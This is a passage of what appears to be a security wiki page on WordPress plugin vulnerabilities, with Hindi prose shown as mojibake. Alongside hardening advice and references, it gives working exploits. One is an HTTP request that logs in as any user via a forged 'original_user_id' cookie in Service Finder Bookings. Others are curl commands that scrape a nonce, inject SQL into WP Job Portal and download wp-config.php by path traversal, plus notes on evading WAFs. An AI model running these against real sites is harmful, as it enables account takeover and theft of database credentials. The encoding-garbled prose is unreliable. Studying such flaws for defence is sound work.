- рд╣рд░ рд╕реНрдерд┐рддрд┐-рдкрд░рд┐рд╡рд░реНрддрди рд╢рд╛рдЦрд╛ рдкрд░ capability checks рд▓рд╛рдЧреВ рдХрд░реЗрдВ (рдЙрджрд╛., `current_user_can('manage_options')` рдпрд╛ рдЬрд╝реНрдпрд╛рджрд╛ рд╕рдЦреНрдд)ред
- рд╕рднреА role/permission рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЗ рд▓рд┐рдП nonces рдЕрдирд┐рд╡рд╛рд░реНрдп рдХрд░реЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░реЗрдВ: `check_admin_referer()` / `wp_verify_nonce()`ред
- рдХрднреА рднреА request-рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП usernames рдкрд░ рднрд░реЛрд╕рд╛ рди рдХрд░реЗрдВ; рд▓рдХреНрд╖реНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкрд░ рдкреНрд░рдорд╛рдгреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рд╕реНрдкрд╖реНрдЯ рдиреАрддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдВред
- рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓/рд░реЛрд▓ рдЕрдкрдбреЗрдЯреНрд╕ рдкрд░ тАЬoriginal rolesтАЭ рд╕реНрдерд┐рддрд┐ рдХреЛ рдЕрдорд╛рдиреНрдп рдХрд░реЗрдВ рддрд╛рдХрд┐ рдкреБрд░рд╛рдиреА рдЙрдЪреНрдЪ-рдЕрдзрд┐рдХрд╛рд░реЛрдВ рд╡рд╛рд▓реА рдкреБрдирд░реНрд╕реНрдерд╛рдкрдирд╛ рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗ:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- рдЕрд╕реНрдерд╛рдпреА role switches рдХреЗ рд▓рд┐рдП рдиреНрдпреВрдирддрдо state рд╣реА рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдФрд░ time-limited, capability-guarded tokens рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВред

---

### Unauthenticated privilege escalation via cookieтАСtrusted user switching on public init (Service Finder тАЬsf-bookingтАЭ)

рдХреБрдЫ plugins рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ `init` hook рдкрд░ user-switching helpers рдХреЛ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ рдФрд░ рдкрд╣рдЪрд╛рди client-controlled cookie рд╕реЗ рдирд┐рдХрд╛рд▓реА рдЬрд╛рддреА рд╣реИред рдпрджрд┐ рдХреЛрдб authentication, capability рдФрд░ рдПрдХ рд╡реИрдз `nonce` рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд┐рдП рдмрд┐рдирд╛ `wp_set_auth_cookie()` рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдХреЛрдИ рднреА unauthenticated visitor рдХрд┐рд╕реА рднреА arbitrary user ID рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝-рдЬрдмрд░реНрджрд╕реНрддреА рд▓реЙрдЧрд┐рди рдХрд░рд╡рд╛ рд╕рдХрддрд╛ рд╣реИред

Typical vulnerable pattern (simplified from Service Finder Bookings тЙд 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ЁЯФе sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
рдХреНрдпреЛрдВ рдпрд╣ exploitable рд╣реИ

- рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ `init` hook рд╣реИрдВрдбрд▓рд░ рдХреЛ unauthenticated users рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдБрдЪ рдпреЛрдЧреНрдп рдмрдирд╛рддрд╛ рд╣реИ (рдХреЛрдИ `is_user_logged_in()` guard рдирд╣реАрдВ).
- рдкрд╣рдЪрд╛рди рдХреНрд▓рд╛рдЗрдВрдЯ-рдкрд░рд┐рд╡рд░реНрддрдиреАрдп cookie (`original_user_id`) рд╕реЗ рдирд┐рдХрд╛рд▓реА рдЬрд╛рддреА рд╣реИ.
- `wp_set_auth_cookie($uid)` рдХреЗ рд╕реАрдзреЗ рдХреЙрд▓ рд╕реЗ рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХреЛ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдмрд┐рдирд╛ рдХрд┐рд╕реА capability/nonce рдЬрд╛рдВрдЪ рдХреЗ.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WordPress/plugin CVEs рдХреЗ рд▓рд┐рдП WAF рдкрд░ рд╡рд┐рдЪрд╛рд░

Generic edge/server WAFs рд╡реНрдпрд╛рдкрдХ рдкреИрдЯрд░реНрди (SQLi, XSS, LFI) рдХреЗ рд▓рд┐рдП рдЯреНрдпреВрди рдХрд┐рдП рдЧрдП рд╣реЛрддреЗ рд╣реИрдВред рдХрдИ highтАСimpact WordPress/plugin flaws рдПрдкреНрд▓рд┐рдХреЗрд╢рди-рд╡рд┐рд╢рд┐рд╖реНрдЯ рд▓реЙрдЬрд┐рдХ/auth рдмрдЧ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рд╕рд╛рдорд╛рдиреНрдп рдЯреНрд░реИрдлрд╝рд┐рдХ рдЬреИрд╕рд╛ рджрд┐рдЦрддреЗ рд╣реИрдВ рдЬрдм рддрдХ engine WordPress routes рдФрд░ plugin semantics рдХреЛ рди рд╕рдордЭреЗред

Offensive notes

- рдХреНрд▓реАрди payloads рдХреЗ рд╕рд╛рде plugin-рд╡рд┐рд╢рд┐рд╖реНрдЯ endpoints рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░реЗрдВ: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- рдкрд╣рд▓реЗ рдЕрдкреНрд░рдорд╛рдгреАрдХреГрдд paths рдЖрдЬрд╝рдорд╛рдПрдБ (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes)ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ payloads рдЕрдХреНрд╕рд░ рдмрд┐рдирд╛ obfuscation рдХреЗ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВред
- рд╕рд╛рдорд╛рдиреНрдп high-impact рдорд╛рдорд▓реЛрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- plugin CVEs рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рд╕рд╛рдорд╛рдиреНрдп WAF signatures рдкрд░ рднрд░реЛрд╕рд╛ рди рдХрд░реЗрдВред рдПрдкреНрд▓рд┐рдХреЗрд╢рди-рд▓реЗрдпрд░, vulnerability-specific рд╡рд░реНрдЪреБрдЕрд▓ рдкреИрдЪ рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдпрд╛ рдЬрд▓реНрджреА рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВред
- рдХреЛрдб рдореЗрдВ negative regex filters рдХреА рдмрдЬрд╛рдп positive-security checks рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдВ (capabilities, nonces, strict input validation)ред

## WordPress рд╕реБрд░рдХреНрд╖рд╛

### рдирд┐рдпрдорд┐рдд рдЕрдкрдбреЗрдЯ

рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ WordPress, plugins, рдФрд░ themes рдЕрдкрдбреЗрдЯреЗрдб рд╣реИрдВред рд╕рд╛рде рд╣реА рдкреБрд╖реНрдЯрд┐ рдХрд░реЗрдВ рдХрд┐ automated updating wp-config.php рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
рд╕рд╛рде рд╣реА, **рдХреЗрд╡рд▓ рднрд░реЛрд╕реЗрдордВрдж WordPress plugins рдФрд░ themes рд╣реА рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ**ред

### рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд▓рдЧрдЗрдиреНрд╕

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **рдЕрдиреНрдп рд╕рд┐рдлрд╛рд░рд┐рд╢реЗрдВ**

- рдбрд┐рдлрд╝реЙрд▓реНрдЯ **admin** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣рдЯрд╛рдПрдБ
- **рдордЬрдмреВрдд рдкрд╛рд╕рд╡рд░реНрдб** рдФрд░ **2FA** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
- рд╕рдордп-рд╕рдордп рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА **рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рдХреА **рд╕рдореАрдХреНрд╖рд╛** рдХрд░реЗрдВ
- Brute Force attacks рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП **рд▓реЙрдЧрд┐рди рдкреНрд░рдпрд╛рд╕реЛрдВ рдХреЛ рд╕реАрдорд┐рдд рдХрд░реЗрдВ**
- **`wp-admin.php`** рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдирд╛рдо рдмрджрд▓реЗрдВ рдФрд░ рдХреЗрд╡рд▓ рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ рдпрд╛ рдХреБрдЫ рдирд┐рд╢реНрдЪрд┐рдд IP рдкрддреЛрдВ рд╕реЗ рд╣реА рдкрд╣реБрдБрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВред

### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

The WP Job Portal recruitment plugin рдиреЗ рдПрдХ **savecategory** рдЯрд╛рд╕реНрдХ рдЙрдЬрд╛рдЧрд░ рдХрд┐рдпрд╛ рдЬреЛ рдЕрдВрддрддрдГ `modules/category/model.php::validateFormData()` рдХреЗ рдЕрдВрджрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд vulnerable code рдХреЛ execute рдХрд░рддрд╛ рд╣реИ:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat тЬЧ
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
рдЗрд╕ snippet рд╕реЗ рдЙрддреНрдкрдиреНрди рдореБрджреНрджреЗ:

1. **Unsanitised user input** тАУ `parentid` рд╕реАрдзрд╛ HTTP request рд╕реЗ рдЖрддрд╛ рд╣реИред
2. **String concatenation inside the WHERE clause** тАУ рдХреЛрдИ `is_numeric()` / `esc_sql()` / prepared statement рдирд╣реАрдВ рд╣реИред
3. **Unauthenticated reachability** тАУ рднрд▓реЗ рд╣реА action `admin-post.php` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ execute рд╣реЛрддрд╛ рд╣реИ, рдпрд╣рд╛рдБ рд╕рд┐рд░реНрдлрд╝ рдПрдХ рдЪреЗрдХ рд╣реИ: **CSRF nonce** (`wp_verify_nonce()`), рдЬрд┐рд╕реЗ рдХреЛрдИ рднреА рд╡рд┐рдЬрд╝рд┐рдЯрд░ рдЙрд╕ public рдкреЗрдЬ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ shortcode `[wpjobportal_my_resumes]` embed рдХрд░рддрд╛ рд╣реИред

#### рд╢реЛрд╖рдг

1. рдПрдХ рдирдпрд╛ nonce рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid` рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ arbitrary SQL рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
рд░рд┐рд╕реНрдкреЙрдиреНрд╕ injected query рдХрд╛ рдкрд░рд┐рдгрд╛рдо рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ рдпрд╛ database рдХреЛ рдмрджрд▓ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ SQLi рд╕рд╛рдмрд┐рдд рд╣реЛрддрд╛ рд╣реИред


### рдЕрдирдкреНрд░рдорд╛рдгрд┐рдд Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

рдПрдХ рдФрд░ task, **downloadcustomfile**, рд╡рд┐рдЬрд╝рд┐рдЯрд░реНрд╕ рдХреЛ path traversal рдХреЗ рдЬрд░рд┐рдП **disk рдкрд░ рдореМрдЬреВрдж рдХрд┐рд╕реА рднреА file** рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рдерд╛ред рдХрдордЬреЛрд░ sink `modules/customfield/model.php::downloadCustomUploadedFile()` рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` рдЕрдЯреИрдХрд░-рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реИ рдФрд░ рдмрд┐рдирд╛ **sanitisation** рдХреЗ рдЬреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд┐рд░ рд╕реЗ, рдПрдХрдорд╛рддреНрд░ рдмрд╛рдзрд╛ рдПрдХ **CSRF nonce** рд╣реИ рдЬрд┐рд╕реЗ resume рдкреГрд╖реНрда рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
рд╕рд░реНрд╡рд░ `wp-config.php` рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ, leaking DB credentials рдФрд░ auth keysред

## рд╕рдВрджрд░реНрдн

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset тАУ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments тЙд 5.6.1 тАУ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation тАУ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
